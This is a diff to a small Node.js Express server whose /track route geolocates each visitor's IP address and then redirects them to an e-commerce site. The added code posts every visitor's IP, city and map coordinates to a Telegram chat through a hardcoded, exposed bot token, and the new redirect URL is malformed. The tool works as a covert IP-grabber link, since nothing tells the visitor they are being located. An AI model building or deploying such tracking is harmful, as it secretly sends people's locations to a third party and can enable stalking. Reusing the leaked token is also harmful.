@@ -3,15 +3,15 @@ const axios = require('axios');
 const fs = require('fs');
 const app = express();
 
-const PORT = 3000;
+const PORT = 3002;
 const LOG_FILE = 'logs.json';
-const WHOIS_API = 'https://ipwho.is';
+const WHOIS_API = 'https://ipwho.is/';
 
 app.get('/track', async (req, res) => {
-  const ip = req.headers['x-forwarded-for']?.split(',')[0];
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
 
   try {
-    const response = await axios.get(`${WHOIS_API}/${ip}`);
+    const response = await axios.get(`${WHOIS_API}${ip}`);
     const data = response.data;
 
     const logEntry = {
@@ -26,6 +26,25 @@ app.get('/track', async (req, res) => {
       }
     };
 
+    // 🔽 Envoi Telegram
+    const message = `
+🌍 Nouvelle IP trackée
+
+Date : ${logEntry.timestamp}
+IP : ${logEntry.ip}
+Pays : ${logEntry.location.country}
+Ville : ${logEntry.location.city}
+Coordonnées : ${logEntry.location.latitude}, ${logEntry.location.longitude}
+[Voir sur Google Maps](https://www.google.com/maps?q=${logEntry.location.latitude},${logEntry.location.longitude})
+`;
+
+    await axios.post(`https://api.telegram.org/bot7904744649:AAGvk_DzuGJ_Fd8e2TsP18rENP3xPFQEEEs/sendMessage`, {
+      chat_id: 5070991962,
+      text: message,
+      parse_mode: 'Markdown'
+    });
+
+    // 💾 Enregistrement dans logs.json (facultatif mais utile)
     let logs = [];
     if (fs.existsSync(LOG_FILE)) {
       const fileData = fs.readFileSync(LOG_FILE);
@@ -35,70 +54,12 @@ app.get('/track', async (req, res) => {
     logs.push(logEntry);
     fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
 
-    res.redirect('https://iziway.cm/')
+    // 🚀 Redirection vers le site e-commerce
+    res.redirect('https://https://iziway.cm/');
   } catch (error) {
-    console.error('Erreur WHOIS:', error.message);
+    console.error('Erreur WHOIS ou Telegram:', error.message);
     res.status(500).send('Erreur lors du tracking.');
   }
-});
-
-app.get('/dashboard', (req, res) => {
-  if (!fs.existsSync(LOG_FILE)) {
-    return res.send('<h1>Aucune donnée de tracking trouvée.</h1>');
-  }
-
-  const logs = JSON.parse(fs.readFileSync(LOG_FILE));
-
-  let html = `
-    <html>
-      <head>
-        <title>Dashboard Tracking</title>
-        <style>
-          body { font-family: sans-serif; padding: 20px; background: #f4f4f4; }
-          table { border-collapse: collapse; width: 100%; background: white; }
-          th, td { padding: 10px; border: 1px solid #ccc; text-align: left; }
-          th { background: #eee; }
-        </style>
-      </head>
-      <body>
-        <h1>Visiteurs trackés</h1>
-        <table>
-          <thead>
-            <tr>
-              <th>IP</th>
-              <th>Date</th>
-              <th>Pays</th>
-              <th>Région</th>
-              <th>Ville</th>
-              <th>Latitude</th>
-              <th>Longitude</th>
-            </tr>
-          </thead>
-          <tbody>
-  `;
-
-  for (const entry of logs) {
-    html += `
-      <tr>
-        <td>${entry.ip}</td>
-        <td>${entry.timestamp}</td>
-        <td>${entry.location.country}</td>
-        <td>${entry.location.region}</td>
-        <td>${entry.location.city}</td>
-        <td>${entry.location.latitude}</td>
-        <td>${entry.location.longitude}</td>
-      </tr>
-    `;
-  }
-
-  html += `
-          </tbody>
-        </table>
-      </body>
-    </html>
-  `;
-
-  res.send(html);
 });
 
 app.listen(PORT, () => {
